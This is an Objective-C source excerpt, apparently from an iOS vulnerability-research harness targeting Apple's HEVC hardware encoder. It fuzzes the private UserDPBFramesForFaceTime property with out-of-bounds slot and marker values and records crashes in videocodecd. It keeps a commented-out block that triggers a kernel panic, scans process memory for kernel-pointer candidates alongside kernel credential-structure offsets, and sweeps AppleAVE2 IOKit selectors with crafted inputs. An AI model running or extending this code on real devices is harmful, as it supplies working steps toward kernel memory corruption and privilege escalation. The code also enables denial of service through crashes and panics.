                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbS);
            if (pbS) {
                @synchronized (cbSink) { [cbSink removeAllObjects]; }
                if (VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
                                                    NULL, NULL, NULL) == noErr) {
                    KPH9Drain(sS, cbSink, 1, 80);
                }
            }
            [report appendString:@"clean IDR prologue done\n"];
            NSArray *cbSnap = nil;
            @synchronized (cbSink) { cbSnap = [cbSink copy]; }
            for (NSString *line in cbSnap) [report appendFormat:@"  %@\n", line];
            if (pbS) CVPixelBufferRelease(pbS);
            VTCompressionSessionInvalidate(sS);
            CFRelease(sS);
        }
        // Grid on ISOLATED sessions - a latched fault must not poison the next row.
        NSMutableArray *schemas = [NSMutableArray arrayWithArray:@[
            @"num0", @"num1", @"data8", @"data32", @"pocslot", @"frameid", @"index", @"ourd"
        ]];
        int sizes[] = { 1, 32 };
        int64_t ptsCounter = 100;
        for (NSString *schema in schemas) {
            for (int si = 0; si < 2; si++) {
                int n = sizes[si];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int e = 0; e < n; e++) {
                    if ([schema isEqualToString:@"num0"]) [arr addObject:@(e)];
                    else if ([schema isEqualToString:@"num1"]) [arr addObject:@1];
                    else if ([schema isEqualToString:@"data8"]) {
                        uint64_t z = (uint64_t)e;
                        [arr addObject:[NSData dataWithBytes:&z length:8]];
                    } else if ([schema isEqualToString:@"data32"]) {
                        uint8_t z[32] = {0};
                        z[0] = (uint8_t)e;
                        [arr addObject:[NSData dataWithBytes:z length:32]];
                    } else if ([schema isEqualToString:@"pocslot"]) {
                        [arr addObject:@{@"POC": @(e), @"Slot": @(e & 0x1F)}];
                    } else if ([schema isEqualToString:@"frameid"]) {
                        [arr addObject:@{@"FrameID": @(e), @"LT": @NO}];
                    } else if ([schema isEqualToString:@"index"]) {
                        [arr addObject:@{@"Index": @(e)}];
                    } else {
                        [arr addObject:@{@"FrameIndex": @(e), @"PicOrderCnt": @(e * 2),
                                         @"IsLongTerm": @NO, @"SlotIndex": @(e & 0x1F)}];
                    }
                }
                [report appendFormat:@"  dpb[%@ x%-2d] %@\n",
                 schema, n, KPH9DPBProbe(arr, ptsCounter++)];
            }
        }
    }

    // === DPB slot OOB ladders (analyst 221032 + 222830 isolation) ===
    // Every row runs on a FRESH session: the first -12912 latches the old
    // session into permanent malfunction and silently faked the later rows.
    [self journal:@"DPB slot OOB ladders"];
    [report appendString:@"\n--- DPB slot OOB ladders (isolated) ---\n"];
    {
        int64_t ptsD = 200;
        // (1) size ladder: how far does CFNumber delivery go?
        int sizeLadder[] = { 64, 256, 1024, 4096 };
        for (int si = 0; si < 4; si++) {
            int n = sizeLadder[si];
            NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
            for (int e = 0; e < n; e++) [arr addObject:@(e)];
            [report appendFormat:@"  size[num0 x%-4d] %@\n", n, KPH9DPBProbe(arr, ptsD++)];
        }
        // (2) value ladder: does the CFNumber index DPB[idx] unchecked?
        long long vals[] = { 15, 16, 17, 32, -1, 0x4141414141414141LL };
        for (int vi = 0; vi < 6; vi++) {
            NSMutableArray *arr = [NSMutableArray array];
            for (int e = 0; e < 16; e++) [arr addObject:@(vals[vi])];
            [report appendFormat:@"  val=0x%llx x16 %@\n", vals[vi], KPH9DPBProbe(arr, ptsD++)];
        }
        // (3) data8 boundaries: guarded by KPH9DPBProbe (non-CFNumber causes
        // -[__NSCFData _getValue:forType:] SIGABRT in videocodecd -> launchd throttleTimeout 320s)
        [report appendString:@"  data8 ladders: skipped (AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200 -[__NSCFData _getValue:forType:] SIGABRT)\n"];
    }

    // === Warmup binary search (analyst patch 2): fill the DPB with 18 real
    // reference frames FIRST (beyond the 16 slots), then submit marker arrays
    // n = 32..64 to find the exact cutoff and any slot-index OOB.
    [self journal:@"DPB warmup + num0 cutoff"];
    [report appendString:@"\n--- DPB warmup + num0 cutoff 32..64 ---\n"];
    {
        NSMutableArray *sink = [NSMutableArray array];
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef sW = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)spec, NULL, NULL,
                                       KPH9AttsCB, (__bridge void *)sink, &sW) == noErr && sW) {
            VTSessionSetProperty(sW, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTCompressionSessionPrepareToEncodeFrames(sW);
            CVPixelBufferRef pbW = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbW);
            if (pbW) {
                @synchronized (sink) { [sink removeAllObjects]; }
                if (VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(0, 30), kCMTimeInvalid,
                                                    NULL, NULL, NULL) == noErr) {
                    KPH9Drain(sW, sink, 1, 80);
                }
                @synchronized (sink) { [sink removeAllObjects]; }
                int warmQueued = 0;
                for (int w = 1; w <= 18; w++) {
                    if (VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(w, 30), kCMTimeInvalid,
                                                        NULL, NULL, NULL) == noErr) {
                        warmQueued++;
                    }
                }
                KPH9Drain(sW, sink, warmQueued, 600);
            }
            [report appendString:@"  DPB warmed with 1 IDR + 18 P-frames\n"];
            int lastOK = 0, firstReject = 0;
            int cutoffVals[] = { 16, 17, 18, 19, 20, 24, 32, 48, 64 };
            for (int ci = 0; ci < 9; ci++) {
                int n = cutoffVals[ci];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int k = 0; k < n; k++) [arr addObject:@(0x4141414100000000ULL | (unsigned)k)];
                OSStatus st = VTSessionSetProperty(sW, CFSTR("UserDPBFramesForFaceTime"),
                                                   (__bridge CFTypeRef)arr);
                OSStatus fe = -1;
                if (pbW) {
                    @synchronized (sink) { [sink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(30 + n, 30),
                                                         kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr) KPH9Drain(sW, sink, 1, 50);
                }
                NSString *cbW = nil;
                @synchronized (sink) {
                    cbW = sink.count ? sink[0] : @"(no cb)";
                }
                if (st == 0) lastOK = n;
                else if (!firstReject) firstReject = n;
                [report appendFormat:@"  warm n=%-2d set=%d enc=%d cb=%@\n",
                 n, (int)st, (int)fe, cbW];
            }
            [report appendFormat:@"  warmup cutoff: last_ok=%d first_reject=%d\n", lastOK, firstReject];
            if (pbW) CVPixelBufferRelease(pbW);
            VTCompressionSessionInvalidate(sW);
            CFRelease(sW);
        }
    }

    // === data8 content fuzz (analyst patch 3b): guarded because NSData in
    // UserDPBFramesForFaceTime crashes videocodecd in AVE_Prop_HEVC_SetUserDPBFramesForFaceTime+200
    [self journal:@"data8 content fuzz (skipped)"];
    [report appendString:@"\n--- data8 content fuzz (len x pattern) ---\n"];
    [report appendString:@"  skipped (-[__NSCFData _getValue:forType:] SIGABRT in videocodecd -> launchd throttleTimeout 320s)\n"];

    // === stage9 PANIC RUNG â€” DISABLED ===
    // To enable: uncomment the block below
    // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
    // VTCompressionSessionRef s9 = NULL;
    // VTCompressionSessionCreate(kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s9);
    // if (s9) {
    //     int usage = 1, ntl = 16463;
    //     CFNumberRef n9;
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage); VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9); CFRelease(n9);
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl); VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9); CFRelease(n9);
    //     VTCompressionSessionPrepareToEncodeFrames(s9);
    //     CVPixelBufferRef pb9 = NULL;
    //     CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb9);
    //     if (pb9) {
    //         VTEncodeInfoFlags f9 = 0;
    //         VTCompressionSessionEncodeFrame(s9, pb9, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f9);
    //         CVPixelBufferRelease(pb9);
    //     }
    //     CFRelease(s9);
    // }

    // === Filtered heap-shaped candidate audit ===
    [report appendString:@"\n--- Filtered candidate audit ---\n"];
    [report appendString:@"Offsets: p_pid=0x60 p_proc_ro=0x18 p_ucred=0x28 cr_uid=0x18\n"];

    uint32_t myPid = (uint32_t)getpid();
    [report appendFormat:@"  our pid: %u\n", myPid];

    NSMutableArray *kptrs2 = [NSMutableArray array];
    vm_address_t sAddr = 0;
    vm_size_t sSize = 0;
    uint32_t sDepth = 0;
    vm_region_submap_info_data_64_t sInfo;
    mach_msg_type_number_t sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;

    // Glossary fix: advance sAddr at the BOTTOM. The old top ternary kept
    // sAddr=0 on __PAGEZERO forever (100% CPU spin), and the submap continue
    // skipped whole submaps. Iteration cap + vm_read_overwrite guarantees safe termination.
    [self journal:@"Filtered candidate audit"];
    int sIter = 0;
    uint64_t sPageBuf[512];
    while (sIter++ < 512 && kptrs2.count < 512) {
        sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &sAddr, &sSize, &sDepth,
                                  (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS || sSize == 0) break;
        if (sInfo.is_submap) { sDepth++; continue; }
        if ((sInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            sSize <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&sInfo, sAddr, sSize, &sDepth, NULL, NULL, 0)) {
            vm_size_t maxBytes = (sSize < 65536) ? sSize : 65536;
            for (vm_size_t off = 0; off + sizeof(sPageBuf) <= maxBytes && kptrs2.count < 512; off += sizeof(sPageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), sAddr + off, sizeof(sPageBuf),
                                      (vm_address_t)sPageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) break;
                size_t words = outSz / sizeof(uint64_t);
                for (size_t i = 0; i < words && kptrs2.count < 512; i++) {
                    uint64_t v = sPageBuf[i];
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        [kptrs2 addObject:@(v)];
                    }
                }
            }
        }
        if (sAddr + sSize <= sAddr) break;
        sAddr += sSize;
    }
    [report appendFormat:@"  filtered candidates: %lu\n", (unsigned long)kptrs2.count];

    int checked = 0;
    static const char *kClsNames[] = { "PACKED_INT32", "BAD_TBI", "UNALIGNED", "ZONE_HEAP", "TEXT_DATA" };
    for (NSNumber *kpNum in kptrs2) {
        uint64_t kaddr = kpNum.unsignedLongLongValue;
        if (checked > 500) break;
        checked++;

        // Per 120328 analysis: classify every candidate â€” the 0xffffffe0..ef
        // band (old "heap" check) is LE int32 pairs from codec tables.
        kptr_class_t cls = KPClassifyKPtr(kaddr);
        if (checked <= 20) {
            [report appendFormat:@"  candidate[%d]: raw=0x%llx %s\n", checked, kaddr, kClsNames[cls]];
        }
    }

    [report appendString:@"  candidate scan complete (unverified without kernel oracle)\n"];

    // === AVE2 userclient probe: direct IOKit path around the VT clamp ===
    [report appendString:@"\n--- AVE2 userclient probe (direct IOKit) ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"IOServiceOpen -> %d (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS) {
            uint64_t scalarIn = 16463;
            for (uint32_t sel = 0; sel <= 32; sel++) {
                uint64_t outVal = 0;
                uint32_t outCnt = 1;
                kern_return_t km = IOConnectCallMethod(conn, sel, &scalarIn, 1,
                                                       NULL, 0, &outVal, &outCnt, NULL, NULL);
                uint64_t structIn[4] = { 16463, 1, 0x59, 0 };
                uint8_t structOut[64] = {0};
                size_t structOutSz = sizeof(structOut);
                kern_return_t ks = IOConnectCallStructMethod(conn, sel, structIn, sizeof(structIn),
                                                             structOut, &structOutSz);
                // Log everything except the plain "no such selector" noise pair
                if (km != (kern_return_t)0xe00002c2 && ks != (kern_return_t)0xe00002c2) {
                    [report appendFormat:@"  sel=%-2u method=%d out=0x%llx | struct=%d outSz=%zu\n",
                     sel, km, outVal, ks, structOutSz];
                }
            }
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"AppleAVE2 userclient not exposed to this process (sandbox)\n"];
    }
    [self journal:@"=== H9 runReport complete ==="];
    return report;
}

@end
